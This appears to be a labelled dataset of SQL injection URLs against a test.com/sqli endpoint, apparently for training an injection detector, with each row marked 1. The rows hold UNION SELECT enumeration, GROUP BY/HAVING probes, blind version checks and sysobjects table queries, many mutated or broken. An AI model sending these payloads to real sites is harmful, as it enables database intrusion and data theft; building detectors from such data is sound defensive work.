"test.com/sqli/?id=%27+GROUP+BY+fname+,+email+having+1%27%3D1&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+fname+,+email+having+1%27%3D1%27&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+fname+,+email+having+%271%27%3D1&Submit=Submit#",1
"test.com/sqli/?id=%27%27+GROUP+BY+fname+,+email+having+1%27%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+fname+,+email+having+%271%27%3D1%27%27+--&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+email+,+fname+having+1%27%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+fname+,+email+having+1%27%3D%27%271%27+--&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+fname+,+email+having+1%27%3D%27%271%27%27+--&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+fname+,+email+having+%27%271%27%3D%27%271%27%27+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27+GROUP+BY+id+,+password+,+fname+having+1%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+id+,+password+,+fname+having+1%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+id+,+password+,+fname+having+1%3D1%27&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+id+,+password+,+fname+having+%27%271%3D1%27&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+password+,+id+,+fname+having+1%3D1&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27+GROUP+BY+id+,+password+,+fname+having+1%3D1%27%27%27+--&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+id+,+password+,+fname+having+1%3D1%27%27%27+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27+GROUP+BY+fname+,+password+,+id+having+%271%27%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27+GROUP+BY+id+,+fname+,+password+having+1%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27+GROUP+BY+id+,+password+,+fname+having+1%3D1%27&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27+GROUP+BY+mname+,+fname+,+lname+having+1%27%3D1%27+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27+GROUP+BY+mname+,+fname+,+lname+having+1%27%3D1%27&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+mname+,+fname+,+lname+having+1%27%3D1%27+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27+GROUP+BY+mname+,+fname+,+lname+having+1%27%3D1%27+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27+GROUP+BY+mname+,+lname+,+fname+having+1%3D1%27+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27+GROUP+BY+mname+,+fname+,+lname+having+%271%27%3D1%27+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27+GROUP+BY+mname+,+fname+,+lname+having+%271%27%27%3D1%27+--&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+mname+,+fname+,+lname+having+1%27%3D1%27%27&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27%27%27+GROUP+BY+mname+,+fname+,+lname+having+1%27%3D1%27+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27+GROUP+BY+mname+,+fname+,+lname+having+%27%27%271%27%3D1%27+--&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+mname+,+password+,+fname+having+90%3D70+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27+GROUP+BY+mname+,+password+,+fname+having+90%3D70+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27+GROUP+BY+mname+,+password,++fname+having+90%3D70+&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+mname+,+password+fname+,+having+%2790%3D70+--&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+mname+,+password+fname+,+having+90%3D70%27+--&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+mname+,+password+,+fname+having+90%27%3D70%27%27+--&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+mname+,+password+,+fname+having+%27%27%2790%3D70+--&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+mname+,+fname+,+password+having+90%3D70+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%25+GROUP+BY+mname+,+password+.+fname+having+%27%27%2790%3D70+--&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+password+,+mname+,+fname+having+90%3D70+--&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+password+,+mname+,+fname+having+1%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27+GROUP+BY+password+,+mname+,+fname+having+1%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27+GROUP+BY+password+,+mname+,+fname+having+1%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27%27+GROUP+BY+password+,+mname+,+fname+having+1%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27+GROUP+BY+password+,+mname+,+fname+having+%271%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27+GROUP+BY+password+,+mname+,+fname+having+1%3D1&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27+GROUP+BY+password+,+mname+,+fname+having+1%3D1%27+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27+GROUP+BY+password+,+mname+,+fname+having+%271%27%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27+GROUP+BY+password+,+mname+,+fname+having+1%3D1%27%27%27&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+password+,+mname+,+fname+having+1%3D%271%27&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+email+,+mname+,+fname+having+1%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+email+,+mname+,+fname+having+1%3D1Submit=Submit#",1
"test.com/sqli/?id=%27%27%27+GROUP+BY+email+,+mname+,+fname+having+1%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+email+,+mname+,+fname+having+%271%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+email+,+mname+,+fname+having+%271%27%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+email+,+mname+,+fname+having+1%3D1%27%27&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27%27%27+GROUP+BY+email+,+mname+,+fname+having+1%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27%27%27+GROUP+BY+email+,+mname+,+fname+having+1%3D1&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27%27%27+GROUP+BY+email+,+mname+,+fname+having+%271%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27%27%27+GROUP+BY+email+,+mname+,+fname+having+1%3D%27%27%271+--&Submit=Submit#",1
test.com/sqli/?id=-1%27+UNION+SELECT+1%2C2%2C3--%2B&Submit=Submit#,1
test.com/sqli/?id=--1%27+UNION+SELECT+1%2C2%2C3--%2B&Submit=Submit#,1
test.com/sqli/?id=---1%27+UNION+SELECT+1%2C2%2C3--%2B&Submit=Submit#,1
test.com/sqli/?id=--1%27%27%27+UNION+SELECT+1%2C2%2C3--%2B&Submit=Submit#,1
test.com/sqli/?id=-1%27+UNION+SELECT+1%2C2%2C3%2B&Submit=Submit#,1
test.com/sqli/?id=%271%27+UNION+SELECT+1%2C2%2C3--%2B&Submit=Submit#,1
test.com/sqli/?id=%27%271%27+UNION+SELECT+1%2C2%2C3--%2B&Submit=Submit#,1
test.com/sqli/?id=-%271%27%27+UNION+SELECT+1%2C2%2C3%2B&Submit=Submit#,1
test.com/sqli/?id=-1%27+UNION+SELECT+1%2C2%2C3--+-%2B&Submit=Submit#,1
test.com/sqli/?id=-1%27+UNION+SELECT+1%2C2%2C3--+--%2B&Submit=Submit#,1
test.com/sqli/?id=-1%27%27+UNION+SELECT+1%2C2%2C3%2C89%2C56--%2B&Submit=Submit#,1
test.com/sqli/?id=-1%27+UNION+SELECT+1%2C2%2C3%2C8%2C5--%2B&Submit=Submit#,1
test.com/sqli/?id=-1%27+UNION+SELECT+1%2C2%2C3%2C89%2C56--+--%2B&Submit=Submit#,1
test.com/sqli/?id=-1%27%27%27+UNION+SELECT+1%2C2%2C3%2C70%2C60--%2B&Submit=Submit#,1
test.com/sqli/?id=-1%27+UNION+SELECT+1%2C2%2C3%2C25%2C40%2B&Submit=Submit#,1
test.com/sqli/?id=1=1%27+UNION+SELECT+1%2C2%2C3%2C89%2C56--%2B&Submit=Submit#,1
test.com/sqli/?id=%271=1%27+UNION+SELECT+1%2C2%2C3%2C89%2C56--%2B&Submit=Submit#,1
test.com/sqli/?id=%27%271=1%27%27%27+UNION+SELECT+1%2C2%2C3%2C89%2C56--%2B&Submit=Submit#,1
test.com/sqli/?id=1=1%27+UNION+SELECT+1%2C2%2C3%2C89%2C56%2B&Submit=Submit#,1
test.com/sqli/?id=-1%27+UNION+SELECT+1%2C2%2C3%2C89%2C56--%2B&Submit=Submit#,1
test.com/sqli/?id=-1%27+UNION+SELECT+1%2C2%2C3%2C9%2C4%2C5--%2B&Submit=Submit#,1
test.com/sqli/?id=-1%27%27%27+UNION+SELECT+1%2C2%2C3%2C89%2C56%2B&Submit=Submit#,1
test.com/sqli/?id=-1%27+UNION+SELECT+1%2C2%2C3%2C89%2C56--+-%2B&Submit=Submit#,1
test.com/sqli/?id=-1+UNION+SELECT+1%2C2%2C3%2C89%2C56%2B&Submit=Submit#,1
test.com/sqli/?id=-1%27+UNION+ALL+SELECT+1%2C2%2C3%2C89%2C56--%2B&Submit=Submit#,1
test.com/sqli/?id=-1%27+UNION+ALL+SELECT+1%2C2%2C3%2C89%2C56--%2B&Submit=Submit#,1
test.com/sqli/?id=-1+UNION+ALL+SELECT+1%2C2%2C3%2C89%2C56%2B&Submit=Submit#,1
test.com/sqli/?id=-1%27%27+UNION+ALL+SELECT+1%2C2%2C3%2C89%2C56--%2B&Submit=Submit#,1
test.com/sqli/?id=%271+UNION+ALL+SELECT+1%2C2%2C3%2C89%2C56%2B&Submit=Submit#,1
test.com/sqli/?id=1=1%27+UNION+ALL+SELECT+1%2C2%2C3%2C89%2C56--%2B&Submit=Submit#,1
test.com/sqli/?id=-1%27+UNION+SELECT+1%2C2%2C3%2C9%2C0%2C1%2C2%2C67--%2B&Submit=Submit#,1
test.com/sqli/?id=-1%27+UNION+SELECT+1%2C2%2C3%2C9%2C0%2C1%2C2%2C67--+-%2B&Submit=Submit#,1
test.com/sqli/?id=-1%27+UNION+SELECT+1%2C2%2C3%2C9%2C0%2C1%2C2%2C21--%2B&Submit=Submit#,1
test.com/sqli/?id=-1%27+UNION+SELECT+1%2C2%2C2%2C7%2C0%2C1%2C2%2C21--%2B&Submit=Submit#,1
test.com/sqli/?id=-1%27+UNION+ALL+SELECT+1%2C2%2C3%2C9%2C0%2C1%2C2%2C21--%2B&Submit=Submit#,1
test.com/sqli/?id=-1%27%27%27+UNION+ALL+SELECT+1%2C2%2C3%2C9%2C0%2C1%2C2%2C21--%2B&Submit=Submit#,1
test.com/sqli/?id=-1%27+UNION+ALL+SELECT+1%2C2%2C3%2C3%2C0%2C1%2C2%2C1--%2B&Submit=Submit#,1
test.com/sqli/?id=-1%27+UNION+SELECT+1%2C2%2C1%2C9%2C0%2C1%2C2%2C1--%2B&Submit=Submit#,1
test.com/sqli/?id=-1+UNION+SELECT+1%2C2%2C3%2C5%2C0%2C1%2C2%2C1--%2B&Submit=Submit#,1
test.com/sqli/?id=-1+UNION+SELECT+1%2C2%2C3%2C7%2C0%2C1%2C2%2C100--%2B&Submit=Submit#,1
test.com/sqli/?id=%27+UNION+SELECT+sum%28id+%29+from+dvwa+--&Submit=Submit#,1
test.com/sqli/?id=%27+UNION+SELECT+sum%28mname+%29+from+dvwa+--&Submit=Submit#,1
test.com/sqli/?id=%27+UNION+SELECT+sum%28lname+%29+from+dvwa+--&Submit=Submit#,1
test.com/sqli/?id=%27+UNION+SELECT+sum%28id+%29+from+dvwa&Submit=Submit#,1
"test.com/sqli/?id=%27+UNION+SELECT+sum%28id+,+fname+%29+from+dvwa+--&Submit=Submit#",1
"test.com/sqli/?id=%27+UNION+SELECT+sum%28id+,+mname+%29+from+dvwa+--&Submit=Submit#",1
"test.com/sqli/?id=%27+UNION+SELECT+sum%28lname+,+fname+%29+from+dvwa+--&Submit=Submit#",1
"test.com/sqli/?id=%27+UNION+SELECT+sum%28email+,+fname+%29+from+dvwa+--&Submit=Submit#",1
"test.com/sqli/?id=%27+UNION+SELECT+sum%28id+,+email+%29+from+dvwa+--&Submit=Submit#",1
"test.com/sqli/?id=%27+UNION+SELECT+sum%28lname+,+id+%29+from+dvwa+--&Submit=Submit#",1
test.com/sqli/?id=%27+AND+MID%28VERSION%28%29%2C1%2C1%29+%3D+%275%27%3B&Submit=Submit#,1
test.com/sqli/?id=%27+AND+MID%28VERSION%28%28%29%29%2C1%2C1%29+%3D+%275%27%3B&Submit=Submit#,1
test.com/sqli/?id=%27+AND+MID%28VERSION%28%28%28%29%29%29%2C1%2C1%29+%3D+%275%27%3B&Submit=Submit#,1
test.com/sqli/?id=%27+AND+MID%28VERSION%28%28%28%%28%2929%29%29%2C1%2C1%29+%3D+%275%27%3B&Submit=Submit#,1
test.com/sqli/?id=%27+AND+MID%28VERSION%28%28%28%28%29%29%29%29%2C1%2C1%29+%3D+%277%27%3B&Submit=Submit#,1
test.com/sqli/?id=%27+AND+MID%28VERSION%28%28%28%28%29%29%29%29%2C1%2C1%29+%3D+%271%27%3B&Submit=Submit#,1
test.com/sqli/?id=%27+AND+MID%28VERSION%28%28%28%28%29%29%29%29%2C1%2C1%29+%3D+%27%271%27%3B&Submit=Submit#,1
test.com/sqli/?id=%27+AND+MID%28VERSION%28%28%29%29%2C1%2C1%29+%3D+%271%27%3B&Submit=Submit#,1
test.com/sqli/?id=%27+AND+MID%28VERSION%28%28%28%28%29%29%29%29%2C1%2C1%29+%3D+%271%27%27%3B&Submit=Submit#,1
test.com/sqli/?id=%27+AND+MID%28VERSION%28%28%28%28%28%29%29%29%29%29%2C1%2C1%29+%3D+%275%27%3B&Submit=Submit#,1
test.com/sqli/?id=%27+AND+MID%28VERSION%28%29%2C5%2C5%29+%3D+%2720%27%3B&Submit=Submit#,1
test.com/sqli/?id=%27+AND+MID%28%28VERSION%28%29%2C5%2C5%29%29+%3D+%2720%27%3B&Submit=Submit#,1
test.com/sqli/?id=%27+AND+MID%28%28%28VERSION%28%29%2C5%2C5%29%29%28+%3D+%2720%27%3B&Submit=Submit#,1
test.com/sqli/?id=%27+AND+MID%28%28%28%28VERSION%28%29%2C5%2C5%29%29%29%29+%3D+%2720%27%3B&Submit=Submit#,1
test.com/sqli/?id=%27+AND+MID%28%28%28%28VERSION%28%29%2C5%2C5%29%29%29%29+%3D+%271%27%3B&Submit=Submit#,1
test.com/sqli/?id=%27+AND+MID%28%28%28%28VERSION%28%29%2C5%2C5%29%29%29%29+%3D+%27%291%27%3B&Submit=Submit#,1
test.com/sqli/?id=%27+AND+MID%28%28%28%28VERSION%28%29%2C5%2C5%29%29%29%29+%3D+%271=1%27%3B&Submit=Submit#,1
test.com/sqli/?id=%27+AND+MID%28%28%28%28VERSION%28%29%2C5%2C5%29%29%29%29+%3D+%27%271%27=%271%27%3B&Submit=Submit#,1
test.com/sqli/?id=%27+AND+MID%28VERSION%28%29%2C5%2C5%29+%3D+%27%271%27=%271%27%3B&Submit=Submit#,1
test.com/sqli/?id=%27+AND+MID%28%28%28VERSION%28%29%2C5%2C5%29%29%29+%3D+%27%271%27=%271%27%3B&Submit=Submit#,1
test.com/sqli/?id=%27+AND+MID%28VERSION%28%29%2C100%2C100%29+%3D+%27300%27%3B&Submit=Submit#,1
test.com/sqli/?id=%27+AND+MID%28VERSION%28%29%2C100%2C100%29+%3D+%271=1%27%3B&Submit=Submit#,1
test.com/sqli/?id=%27%27+AND+MID%28VERSION%28%29%2C100%2C100%29+%3D+%271=1%27%3B&Submit=Submit#,1
test.com/sqli/?id=%27+AND+MID%28VERSION%28%29%2C100%2C100%29+%3D+%271=1%27%27%3B&Submit=Submit#,1
test.com/sqli/?id=%27+AND+MID%28VERSION%28%29%2C1%2C1%29+%3D+%27%271=1%27%3B&Submit=Submit#,1
test.com/sqli/?id=%27+AND+MID%28VERSION%28%29%2C1%2C1%29+%3D+%271=1%3B&Submit=Submit#,1
test.com/sqli/?id=%27+AND+MID%28VERSION%28%29%2C1%2C1%29+%3D+1=1%27%3B&Submit=Submit#,1
test.com/sqli/?id=%27+AND+MID%28VERSION%28%29%2C1%2C1%29+%3D+1=1%27%27%3B&Submit=Submit#,1
test.com/sqli/?id=AND+MID%28VERSION%28%29%2C1%2C1%29+%3D+%27%271%27%3B&Submit=Submit#,1
test.com/sqli/?id=%27%27%27%27+AND+MID%28VERSION%28%29%2C1%2C1%29+%3D+%27%271=1%27%3B&Submit=Submit#,1
test.com/sqli/?id=%27+AND+MID%28VERSION%28%29%2C90%2C700%29+%3D+%2760%27%3B&Submit=Submit#,1
test.com/sqli/?id=%28VERSION%28%29%2C90%2C700%29+%3D+%2760%27%3B&Submit=Submit#,1
test.com/sqli/?id=%28VERSION%28%29%2C90%2C700%29+%3D+%271=1%27%3B&Submit=Submit#,1
test.com/sqli/?id=%28VERSION%28%29%2C90%2C700%29+%3D+1=1%3B&Submit=Submit#,1
test.com/sqli/?id=%28VERSION%28%28%29%29%2C90%2C700%29+%3D+%271=1%27%3B&Submit=Submit#,1
test.com/sqli/?id=%28VERSION%28%29%2C90%2C700%29+%3D+1=1%27%3B&Submit=Submit#,1
test.com/sqli/?id=%28VERSION%28%28%28%29%29%29%2C90%2C700%29+%3D+%271=1%27%3B&Submit=Submit#,1
test.com/sqli/?id=%28VERSION%28%28%29%29%2C90%2C700%29+%3D+%271=1%27%27%3B&Submit=Submit#,1
test.com/sqli/?id=%28VERSION%28%28%29%29%2C90%2C700%29+%3D+%27%27%271=1%27%27%3B&Submit=Submit#,1
test.com/sqli/?id=%28%28VERSION%28%28%29%29%2C90%2C700%29%29+%3D+%27%27%271=1%27%27%3B&Submit=Submit#,1
test.com/sqli/?id=+and+1+in+%28select+min%28name%29+from+sysobjects+where+xtype+%3D+%27U%27+and+name+%3E+%27.%27%29+--&Submit=Submit#,1
test.com/sqli/?id=+and+1+in+%28select+min%28id%29+from+sysobjects+where+xtype+%3D+%27U%27+and+id+%3E+%27.%27%29+--&Submit=Submit#,1
test.com/sqli/?id=+and+1+in+%28select+min%28id%29+from+sysobjects+where+xtype+%3D+%27%27U%27+and+id+%3E+%27.%27%29+--&Submit=Submit#,1
test.com/sqli/?id=+and+1+in+%28select+min%28id%29+from+sysobjects+where+xtype+%3D+%27%27%27U%27+and+id+%3E+%27.%27%29+--&Submit=Submit#,1
test.com/sqli/?id=+and+1+in+%28select+min%28id%29+from+sysobjects+where+xtype+%3D+U%27+and+id+%3E+%27.%27%29+--&Submit=Submit#,1
test.com/sqli/?id=+and+1+in+%28select+min%28id%29+from+sysobjects+where+xtype+%3D+%27%27U+and+id+%3E+%27.%27%29+--&Submit=Submit#,1
test.com/sqli/?id=+and+1+in+%28select+min%28id%29+from+sysobjects+where+xtype+%3D+%27%27U%27%27%27+and+id+%3E+%27.%27%29+--&Submit=Submit#,1
test.com/sqli/?id=+and+%271+in+%28select+min%28id%29+from+sysobjects+where+xtype+%3D+%27%27U%27+and+id+%3E+%27.%27%29+--&Submit=Submit#,1
test.com/sqli/?id=+and+%271%27+in+%28select+min%28id%29+from+sysobjects+where+xtype+%3D+%27%27U%27+and+id+%3E+%27.%27%29+--&Submit=Submit#,1
test.com/sqli/?id=+and+%27%271%27%27+in+%28select+min%28id%29+from+sysobjects+where+xtype+%3D+%27%27U%27+and+id+%3E+%27.%27%29+--&Submit=Submit#,1
test.com/sqli/?id=+and+80+in+%28select+min%28fname%29+from+sysobjects+where+xtype+%3D+U+and+fname+%3E+%27.%27%29+--&Submit=Submit#,1
test.com/sqli/?id=+and+80+in+%28select+min%28fname%29+from+sysobjects+where+xtype+%3D+%27%27U%27%27+and+fname+%3E+%27.%27%29+--&Submit=Submit#,1
test.com/sqli/?id=+and+%271+in+%28select+min%28fname%29+from+sysobjects+where+xtype+%3D+%27%27U%%2727+and+fname+%3E+%27.%27%29+--&Submit=Submit#,1
test.com/sqli/?id=+and+%271%27+in+%28select+min%28fname%29+from+sysobjects+where+xtype+%3D+%27U%%2727+and+fname+%3E+%27.%27%29+--&Submit=Submit#,1
test.com/sqli/?id=+and+%27%271%27+in+%28select+min%28fname%29+from+sysobjects+where+xtype+%3D+%27U%%2727+and+fname+%3E+%27.%27%29+--&Submit=Submit#,1
test.com/sqli/?id=+and+%271%27+in+%28select+min%28fname%29+from+sysobjects+where+xtype+%3D+%27U%%2727+and+fname+%3E+.%29+--&Submit=Submit#,1
test.com/sqli/?id=+and+%271%27+in+%28select+min%28fname%29+from+sysobjects+where+xtype+%3D+%27U%%2727+and+fname+%3E+%27%27.%27%27%29+--&Submit=Submit#,1
test.com/sqli/?id=+and+%27%271%27+in+%28select+min%28fname%29+from+sysobjects+where+xtype+%3D+%27%27U%%2727+and+fname+%3E+%27.%27%29+--&Submit=Submit#,1
test.com/sqli/?id=+and+%27%271%27%27+in+%28select+min%28fname%29+from+sysobjects+where+xtype+%3D+%27%27U%%2727+and+fname+%3E+%27%27.%27%27%29+--&Submit=Submit#,1
test.com/sqli/?id=+and+80+in+%28select+min%28fname%29+from+sysobjects+where+xtype+%3D+%27U%27+and+fname+%3E+%27.%27%29+--&Submit=Submit#,1
test.com/sqli/?id=and+600+in+%28select+min%28email%29+from+sysobjects+where+xtype+%3D+%27U%27+and+email+%3E+%27.%27%29+--&Submit=Submit#,1
test.com/sqli/?id=and+1+in+%28select+min%28email%29+from+sysobjects+where+xtype+%3D+%27U%27+and+email+%3E+%27.%27%29+--&Submit=Submit#,1
test.com/sqli/?id=and+%271+in+%28select+min%28email%29+from+sysobjects+where+xtype+%3D+%27U%27+and+email+%3E+%27.%27%29+--&Submit=Submit#,1
test.com/sqli/?id=and+%27%271+in+%28select+min%28email%29+from+sysobjects+where+xtype+%3D+%27U%27+and+email+%3E+%27.%27%29+--&Submit=Submit#,1
test.com/sqli/?id=and+%27%271%27+in+%28select+min%28email%29+from+sysobjects+where+xtype+%3D+%27U%27+and+email+%3E+%27.%27%29+--&Submit=Submit#,1
test.com/sqli/?id=and+%27%271%27+in+%28select+min%28email%29+from+sysobjects+where+xtype+%3D+%27U%27+and+email+%3E+%.%29+--&Submit=Submit#,1
test.com/sqli/?id=and+%27%271%27+in+%28select+min%28email%29+from+sysobjects+where+xtype+%3D+%27U%27+and+email+%3E+%27.%29+--&Submit=Submit#,1
test.com/sqli/?id=and+%27%271%27+in+%28select+min%28email%29+from+sysobjects+where+xtype+%3D+U+and+email+%3E+%27.%27%29+--&Submit=Submit#,1
test.com/sqli/?id=and+%27%271%27%27+in+%28select+min%28email%29+from+sysobjects+where+xtype+%3D+%27U%27+and+email+%3E+%27%27.%27%27%29+--&Submit=Submit#,1
test.com/sqli/?id=and+%27%271%27+in+%28select+min%28email%29+from+sysobjects+where+xtype+%3D+%27U%27+and+email+%3E+%27%27.%27%29+--&Submit=Submit#,1
test.com/sqli/?id=and+1+in+%28select+min%28lname%29+from+sysobjects+where+xtype+%3D+%27U%27+and+lname+%3E+%27.%27%29+--&Submit=Submit#,1
test.com/sqli/?id=and+69+in+%28select+min%28lname%29+from+sysobjects+where+xtype+%3D+%27U%27+and+lname+%3E+%27.%27%29+--&Submit=Submit#,1
test.com/sqli/?id=and+%271+in+%28select+min%28lname%29+from+sysobjects+where+xtype+%3D+%27U%27+and+lname+%3E+%27.%27%29+--&Submit=Submit#,1
test.com/sqli/?id=and+%271%27+in+%28select+min%28lname%29+from+sysobjects+where+xtype+%3D+%27U%27+and+lname+%3E+%27.%27%29+--&Submit=Submit#,1
test.com/sqli/?id=and+%271+in+%28select+min%28lname%29+from+sysobjects+where+xtype+%3D+U+and+lname+%3E+.%29+--&Submit=Submit#,1
test.com/sqli/?id=and+%271%27+in+%28select+min%28lname%29+from+sysobjects+where+xtype+%3D+U+and+lname+%3E+.%29+--&Submit=Submit#,1
test.com/sqli/?id=and+%27%271+in+%28select+min%28lname%29+from+sysobjects+where+xtype+%3D+U+and+lname+%3E+.%29+--&Submit=Submit#,1
test.com/sqli/?id=and+%27%27%271%27%27+in+%28select+min%28lname%29+from+sysobjects+where+xtype+%3D+U+and+lname+%3E+.%29+--&Submit=Submit#,1
test.com/sqli/?id=and+%27%27%271%27%27+in+%28select+min%28lname%29+from+sysobjects+where+xtype+%3D+%27U%27+and+lname+%3E+.%29+--&Submit=Submit#,1
test.com/sqli/?id=and+%27%27%271%27%27+in+%28select+min%28lname%29+from+sysobjects+where+xtype+%3D+%27%27U%27%27+and+lname+%3E+.%29+--&Submit=Submit#,1
test.com/sqli/?id=OR+3409%3D3409+AND+%28%27pytW%27+LIKE+%27pytW&Submit=Submit#,1
test.com/sqli/?id=OR+%273409%3D3409+AND+%28%27pytW%27+LIKE+%27pytW&Submit=Submit#,1
test.com/sqli/?id=OR+%271%3D1+AND+%28%27pytW%27+LIKE+%27pytW&Submit=Submit#,1
test.com/sqli/?id=OR+%27%271%3D1+AND+%28%27pytW%27+LIKE+%27pytW&Submit=Submit#,1
test.com/sqli/?id=OR+%27%27%271%3D1+AND+%28%27pytW%27+LIKE+%27pytW&Submit=Submit#,1
test.com/sqli/?id=OR+%27%27%271%27%3D1+AND+%28%27pytW%27+LIKE+%27pytW&Submit=Submit#,1
test.com/sqli/?id=OR+%27%27%271%27%27%3D1+AND+%28%27pytW%27+LIKE+%27pytW&Submit=Submit#,1
test.com/sqli/?id=OR+%27%27%271%27%27%3D1+AND+%28%27pytW%27+LIKE+pytW&Submit=Submit#,1
test.com/sqli/?id=OR+%27%27%271%27%27%3D1+AND+%28%27pytW%27+LIKE+%27%27pytW&Submit=Submit#,1
test.com/sqli/?id=OR+%27%27%271%27%27%3D1+AND+%28%27pytW%27+LIKE+%27%27%27pytW&Submit=Submit#,1
test.com/sqli/?id=OR+8%3D+AND+%28%27pytW%27+LIKE+%27pytW&Submit=Submit#,1
test.com/sqli/?id=1+OR+%27%271%27%27%3D1+AND+%28%27pytW%27+LIKE+%27pytW&Submit=Submit#,1
test.com/sqli/?id=1+OR+%271%27%27%3D1+AND+%28%27pytW%27+LIKE+%27pytW&Submit=Submit#,1
test.com/sqli/?id=1+OR+%3D1+AND+%28%27pytW%27+LIKE+%27pytW&Submit=Submit#,1
test.com/sqli/?id=1+OR+%27%27%271%27%27%3D1+AND+%28%27pytW%27+LIKE+pytW&Submit=Submit#,1
test.com/sqli/?id=1+OR+%3D1+AND+%28%27pytW+LIKE+%27pytW&Submit=Submit#,1
test.com/sqli/?id=1+OR+%3D1+AND+%28%27pytW+LIKE+pytW&Submit=Submit#,1
test.com/sqli/?id=1+OR+%3D1%27+AND+%28%27pytW+LIKE+%27pytW&Submit=Submit#,1
test.com/sqli/?id=1+OR+%3D1%27+AND+%28%27pytW%27+LIKE+%27pytW&Submit=Submit#,1
test.com/sqli/?id=1+OR+%3D1%27+AND+%28%27%27%27pytW%27%27%27+LIKE+%27pytW&Submit=Submit#,1
test.com/sqli/?id=OR+890%3D+AND+%28%27pytW%27+LIKE+%27pytW&Submit=Submit#,1
test.com/sqli/?id=%271+OR+%3D1%27+AND+%28%27%27%27pytW%27%27%27+LIKE+%27pytW&Submit=Submit#,1
test.com/sqli/?id=%27%271+OR+%3D1%27+AND+%28%27%27%27pytW%27%27%27+LIKE+%27pytW&Submit=Submit#,1
test.com/sqli/?id=%27%271%27+OR+%3D1%27+AND+%28%27%27%27pytW%27%27%27+LIKE+%27pytW&Submit=Submit#,1
test.com/sqli/?id=%27%271%27%27+OR+%3D1%27+AND+%28%27%27%27pytW%27%27%27+LIKE+%27pytW&Submit=Submit#,1
test.com/sqli/?id=%27%27%271%27+OR+%3D1%27+AND+%28%27%27%27pytW%27%27%27+LIKE+pytW&Submit=Submit#,1
test.com/sqli/?id=%27%271%27+OR+%3D1%27+AND+%28%27%27pytW%27%27%27+LIKE+%27pytW%27&Submit=Submit#,1
test.com/sqli/?id=%27%271%27+OR+%3D1%27+AND+%28%27pytW%27%+LIKE+%27pytW&Submit=Submit#,1
test.com/sqli/?id=+OR+%3D1%27+AND+%28%27pytW%27%+LIKE+%27pytW&Submit=Submit#,1
test.com/sqli/?id=+OR+%3D1%27+AND+%28%27pytW%27%+LIKE+%27pytW%27&Submit=Submit#,1
test.com/sqli/?id=OR+1000%3D+AND+%28%27pytW%27+LIKE+%27pytW&Submit=Submit#,1
test.com/sqli/?id=OR+1000%3D+AND+%28%27KtyB%27+LIKE+%27KtyB&Submit=Submit#,1
test.com/sqli/?id=OR+1%3D+AND+%28%27KtyB%27+LIKE+%27KtyB&Submit=Submit#,1
test.com/sqli/?id=OR+1%27%3D+AND+%28%27KtyB%27+LIKE+%27KtyB&Submit=Submit#,1
test.com/sqli/?id=OR+%271%27%3D+AND+%28%27KtyB%27+LIKE+%27KtyB&Submit=Submit#,1
test.com/sqli/?id=OR+%271%27%3D+AND+%28%27KtyB%27+LIKE+%27KtyB%27&Submit=Submit#,1
test.com/sqli/?id=OR+%271%27%3D+AND+%28%27%27KtyB%27%27+LIKE+%27KtyB%27&Submit=Submit#,1
test.com/sqli/?id=OR+%271%27%3D+AND+%28%27KtyB%27+LIKE+%27%27KtyB%27&Submit=Submit#,1
